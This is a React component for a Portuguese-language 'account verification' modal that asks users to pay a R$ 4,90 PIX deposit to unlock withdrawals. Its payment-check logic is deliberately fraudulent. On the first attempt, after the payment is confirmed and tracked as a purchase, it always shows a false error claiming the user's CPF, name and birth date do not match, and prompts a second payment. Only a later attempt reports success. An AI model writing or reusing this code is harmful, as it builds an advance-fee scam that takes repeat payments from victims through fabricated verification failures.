import React, { useState, useEffect, useRef } from 'react';
import { X, Shield, CheckCircle, Copy, QrCode, AlertTriangle, Info } from 'lucide-react';
import { useFictionalPix } from '../hooks/useFictionalPix';
import { QRCodeGenerator } from './QRCodeGenerator';
import { trackPurchase } from '../utils/tracking';

interface KYCDepositModalProps {
  isOpen: boolean;
  onClose: () => void;
  onVerificationComplete: () => void;
  onVerificationFailed: () => void;
  depositAttempt: number;
}

export const KYCDepositModal: React.FC<KYCDepositModalProps> = ({
  isOpen,
  onClose,
  onVerificationComplete,
  onVerificationFailed,
  depositAttempt
}) => {
  const [isGenerating, setIsGenerating] = useState(false);
  const [pixGenerated, setPixGenerated] = useState(false);
  const [copied, setCopied] = useState(false);
  const [processingPayment, setProcessingPayment] = useState(false);
  const [showError, setShowError] = useState(false);
  const { pixData, createPix, checkPixStatus, reset } = useFictionalPix();
  const paymentCheckIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const isProcessingRef = useRef(false);
  const hasTrackedPurchaseRef = useRef(false);

  const DEPOSIT_AMOUNT = 4.90;
  const isFirstAttempt = depositAttempt === 1;

  useEffect(() => {
    if (!isOpen) {
      if (paymentCheckIntervalRef.current) {
        clearInterval(paymentCheckIntervalRef.current);
        paymentCheckIntervalRef.current = null;
      }
      setIsGenerating(false);
      setPixGenerated(false);
      setCopied(false);
      setProcessingPayment(false);
      setShowError(false);
      isProcessingRef.current = false;
      hasTrackedPurchaseRef.current = false;
      reset();
    }
  }, [isOpen, reset]);

  useEffect(() => {
    if (!pixData || !isOpen || !pixGenerated) return;

    const checkPayment = async () => {
      if (isProcessingRef.current) return;

      try {
        const status = await checkPixStatus(pixData.transactionId);

        if (status.status === 'paid' && !isProcessingRef.current) {
          isProcessingRef.current = true;

          if (paymentCheckIntervalRef.current) {
            clearInterval(paymentCheckIntervalRef.current);
            paymentCheckIntervalRef.current = null;
          }

          setProcessingPayment(true);

          if (isFirstAttempt && !hasTrackedPurchaseRef.current) {
            trackPurchase(status.value);
            hasTrackedPurchaseRef.current = true;
          }

          setTimeout(() => {
            if (isFirstAttempt) {
              setShowError(true);

              setTimeout(() => {
                onVerificationFailed();
                setTimeout(() => {
                  onClose();
                }, 500);
              }, 3000);
            } else {
              onVerificationComplete();

              setTimeout(() => {
                onClose();
              }, 2000);
            }
          }, 2000);
        }
      } catch (err) {
        console.error('Erro ao verificar pagamento:', err);
      }
    };

    checkPayment();
    const interval = setInterval(checkPayment, 3000);
    paymentCheckIntervalRef.current = interval;

    return () => {
      if (interval) clearInterval(interval);
    };
  }, [pixData, isOpen, pixGenerated, checkPixStatus, onVerificationComplete, onVerificationFailed, onClose, isFirstAttempt]);

  const handleGeneratePix = async () => {
    setIsGenerating(true);

    try {
      await createPix(DEPOSIT_AMOUNT);
      setPixGenerated(true);
    } catch (err) {
      console.error('Erro ao gerar PIX:', err);
    } finally {
      setIsGenerating(false);
    }
  };

  const copyPixCode = async () => {
    if (!pixData?.qrcode) return;

    try {
      await navigator.clipboard.writeText(pixData.qrcode);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error('Erro ao copiar:', err);
    }
  };

  if (!isOpen) return null;

  if (showError) {
    return (
      <div className="fixed inset-0 bg-black/90 backdrop-blur-sm flex items-center justify-center p-4 z-[70]">
        <div className="bg-gray-900 rounded-2xl shadow-2xl w-full max-w-sm border border-orange-500 p-6 animate-scale-in">
          <div className="text-center">
            <div className="w-16 h-16 bg-orange-500/20 rounded-full flex items-center justify-center mx-auto mb-3">
              <AlertTriangle className="w-8 h-8 text-orange-400" />
            </div>
            <h3 className="text-white font-bold text-lg mb-3">Ops! Dados nao conferem</h3>
            <div className="bg-orange-500/10 rounded-lg p-3 mb-4 border border-orange-500/30">
              <p className="text-orange-200 text-sm leading-relaxed mb-2">
                Os dados informados nao correspondem ao titular da conta PIX.
              </p>
              <p className="text-gray-300 text-xs leading-relaxed">
                Por favor, verifique se o CPF, nome completo e data de nascimento estao corretos e coincidem com os dados do titular da conta bancaria.
              </p>
            </div>
            <div className="bg-blue-500/10 rounded-lg p-2.5 border border-blue-500/30">
              <p className="text-blue-300 text-xs leading-relaxed">
                Revise seus dados e tente novamente. Ao corrigir as informacoes, a verificacao sera aprovada com sucesso.
              </p>
            </div>
          </div>
        </div>
      </div>
    );
  }

  if (processingPayment && !showError) {
    return (
      <div className="fixed inset-0 bg-black/90 backdrop-blur-sm flex items-center justify-center p-4 z-[70]">
        <div className="bg-gray-900 rounded-2xl shadow-2xl w-full max-w-sm border border-gray-800 p-6">
          <div className="text-center">
            <div className="w-16 h-16 bg-accent/20 rounded-full flex items-center justify-center mx-auto mb-3">
              <div className="w-8 h-8 border-3 border-accent border-t-transparent rounded-full animate-spin"></div>
            </div>
            <h3 className="text-white font-bold text-lg mb-2">Validando Pagamento</h3>
            <p className="text-gray-400 text-xs">
              Verificando seu deposito...
            </p>
          </div>
        </div>
      </div>
    );
  }

  if (pixGenerated && pixData) {
    return (
      <div className="fixed inset-0 bg-black/90 backdrop-blur-sm flex items-center justify-center p-4 z-[70] overflow-y-auto">
        <div className="bg-gray-900 rounded-2xl shadow-2xl w-full max-w-sm border border-gray-800 my-4 max-h-[90vh] overflow-y-auto">
          <div className="bg-accent p-3 rounded-t-2xl sticky top-0 z-10">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <div className="w-8 h-8 bg-white/20 rounded-full flex items-center justify-center">
                  <QrCode className="w-4 h-4 text-white" />
                </div>
                <div>
                  <h3 className="text-white font-bold text-sm">PIX de Verificacao</h3>
                  <p className="text-white/80 text-xs">R$ {pixData.amount.toFixed(2).replace('.', ',')}</p>
                </div>
              </div>
              <button
                onClick={onClose}
                className="w-7 h-7 bg-white/20 rounded-full flex items-center justify-center hover:bg-white/30 transition-all"
              >
                <X className="w-4 h-4 text-white" />
              </button>
            </div>
          </div>

          <div className="p-3">
            <div className="space-y-3">

              <div className="bg-gray-800 rounded-xl p-4 text-center border border-accent/30">
                <div className="bg-white rounded-lg p-3 inline-block mb-2 shadow-lg">
                  <QRCodeGenerator
                    value={pixData.qrcode}
                    size={160}
                    className="mx-auto"
                  />
                </div>
                <p className="text-gray-300 text-xs font-semibold">Escaneie com seu banco</p>
              </div>


              <div className="bg-gray-800 rounded-lg p-2.5 border border-gray-700">
                <input
                  type="text"
                  value={pixData.qrcode}
                  readOnly
                  className="w-full px-2 py-2 bg-gray-900 border border-gray-700 rounded text-[10px] font-mono mb-2 focus:outline-none text-white select-all"
                  onClick={(e) => (e.target as HTMLInputElement).select()}
                />
                <button
                  onClick={copyPixCode}
                  className={`w-full py-2.5 rounded-lg font-bold transition-all duration-300 active:scale-95 text-xs ${
                    copied
                      ? 'bg-green-500 text-white'
                      : 'bg-accent text-white hover:bg-accent-hover'
                  }`}
                  style={{ touchAction: 'manipulation' }}
                >
                  {copied ? (
                    <div className="flex items-center justify-center gap-1.5">
                      <CheckCircle className="w-3.5 h-3.5" />
                      <span>Copiado!</span>
                    </div>
                  ) : (
                    <div className="flex items-center justify-center gap-1.5">
                      <Copy className="w-3.5 h-3.5" />
                      <span>Copiar Codigo</span>
                    </div>
                  )}
                </button>
              </div>

              <div className="bg-green-900/50 border border-green-600 rounded-lg p-2.5">
                <div className="flex items-center justify-center gap-2">
                  <div className="w-3.5 h-3.5 border-2 border-green-400 border-t-transparent rounded-full animate-spin"></div>
                  <p className="text-green-200 text-xs font-semibold">
                    Aguardando pagamento
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 bg-black/90 backdrop-blur-sm flex items-center justify-center p-4 z-[70]">
      <div className="bg-gray-900 rounded-2xl shadow-2xl w-full max-w-sm border border-gray-800">
        <div className="bg-accent p-3 rounded-t-2xl relative overflow-hidden">
          <button
            onClick={onClose}
            className="absolute top-2 right-2 text-white/80 hover:text-white transition-colors z-10 w-7 h-7 flex items-center justify-center"
          >
            <X className="w-4 h-4" />
          </button>

          <div className="relative z-10 text-center pt-1">
            <div className="w-10 h-10 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-2">
              <Shield className="w-5 h-5 text-white" />
            </div>
            <h2 className="text-lg font-bold text-white mb-1">Verificacao de Conta</h2>
            <p className="text-white/80 text-xs">Confirme sua titularidade</p>
          </div>
        </div>

        <div className="p-3">

          <div className="bg-gray-800 rounded-lg p-4 border border-gray-700 text-center mb-3">
            <div className="w-12 h-12 bg-accent/20 rounded-full flex items-center justify-center mx-auto mb-2">
              <Shield className="w-6 h-6 text-accent" />
            </div>
            <h3 className="text-white font-bold text-base mb-2">Deposito de Verificacao</h3>
            <p className="text-gray-400 text-xs mb-3">
              Confirme que voce e o titular da conta
            </p>

            <div className="bg-accent/10 rounded-lg p-3 mb-3 border border-accent/30">
              <div className="text-accent text-2xl font-bold mb-1">
                R$ {DEPOSIT_AMOUNT.toFixed(2).replace('.', ',')}
              </div>
              <p className="text-gray-400 text-[10px]">Valor minimo</p>
            </div>

            <button
              onClick={handleGeneratePix}
              disabled={isGenerating}
              className="w-full bg-accent text-white font-bold py-3 rounded-lg hover:bg-accent-hover transition-all duration-300 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed text-sm"
              style={{ touchAction: 'manipulation' }}
            >
              {isGenerating ? (
                <div className="flex items-center justify-center gap-2">
                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  <span>Gerando PIX...</span>
                </div>
              ) : (
                'Gerar PIX de Verificacao'
              )}
            </button>
          </div>

          <div className="bg-gray-800/50 rounded-lg p-2.5 border border-gray-700">
            <p className="text-gray-400 text-[10px] text-center leading-relaxed">
              Apos confirmacao, saques serao liberados automaticamente
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};
